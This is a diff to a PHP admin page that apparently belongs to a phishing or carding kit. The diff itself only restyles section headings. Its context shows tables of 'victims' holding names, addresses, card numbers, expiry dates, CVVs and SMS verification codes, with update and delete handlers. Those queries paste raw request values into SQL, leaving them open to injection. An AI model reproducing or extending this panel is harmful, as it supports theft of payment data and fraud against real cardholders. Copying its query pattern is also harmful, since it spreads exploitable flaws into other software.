@@ -39,6 +39,8 @@ session_start();
 
 
 
+<div style="color:red;  font:800 20px 'cairo'; " >INSERT PRODUCT</div>
+
 <?php
 if(isset($_POST['submit']))  
 {
@@ -101,7 +103,7 @@ if(isset($_POST['submit']))
 
 
 <br/><br/><br/><br/><br/>
-les product
+<div style="color:red;  font:800 20px 'cairo'; " >les product</div>
 
 
 <?php
@@ -188,7 +190,7 @@ foreach($result as $row)
 
 
 <br/><br/><br/><br/><br/>
-les victime
+<div style="color:red;  font:800 20px 'cairo'; " > les victime </div>
 
 <?php
 if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update orderclien set id='".$_POST['id']."',   datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       img='".$_POST['img']."',     title='".$_POST['title']."',    	price1='".$_POST['price1']."',	quantity='".$_POST['quantity']."',	color='".$_POST['color']."',		sizee='".$_POST['sizee']."',	shipping='".$_POST['shipping']."',	subtotal='".$_POST['subtotal']."',	  totalprice='".$_POST['totalprice']."',  totalitem='".$_POST['totalitem']."',      email='".$_POST['email']."',	firstname='".$_POST['firstname']."',	lastname='".$_POST['lastname']."',	address='".$_POST['address']."',	city='".$_POST['city']."',	country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."'        where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
@@ -273,7 +275,7 @@ foreach($result as $row)
 
 
 <br/><br/><br/><br/><br/>
-les victime avec codsms
+<div style="color:red;  font:800 20px 'cairo'; " >les victime avec codsms</div>
 <?php 
 if(isset($_POST['update']))  {	if(     mysqli_query( $con  ,  "  update codesmsorderclien set  id='".$_POST['id']."',  datetime='".$_POST['datetime']."',  ip='".$_POST['ip']."',       totalitem='".$_POST['totalitem']."',    totalprice='".$_POST['totalprice']."',   email='".$_POST['email']."',    	firstname='".$_POST['firstname']."',	  lastname='".$_POST['lastname']."',  address='".$_POST['address']."',	city='".$_POST['city']."',		country='".$_POST['country']."',	postcode='".$_POST['postcode']."',	phone='".$_POST['phone']."',	nameoncard='".$_POST['nameoncard']."',	cardnumber='".$_POST['cardnumber']."',	expmm='".$_POST['expmm']."',	expyy='".$_POST['expyy']."',	cvv='".$_POST['cvv']."',	codesms='".$_POST['codesms']."'	         where id='".$_GET['ID']."'  "   )  )    {header("location:admin.php");} else { header("location:admin.php");}      }
 if(isset($_POST['delete']))  {	if(     mysqli_query( $con  ,  "  delete from codesmsorderclien where id='".$_GET['ID']."'    "   )  )         {header("location:admin.php");} else { header("location:admin.php");}      }	  
@@ -362,7 +364,7 @@ foreach($result as $row)
 
 
 <br/><br/><br/><br/><br/>
-les message
+<div style="color:red;  font:800 20px 'cairo'; " >les message</div>
 
 
 <?php
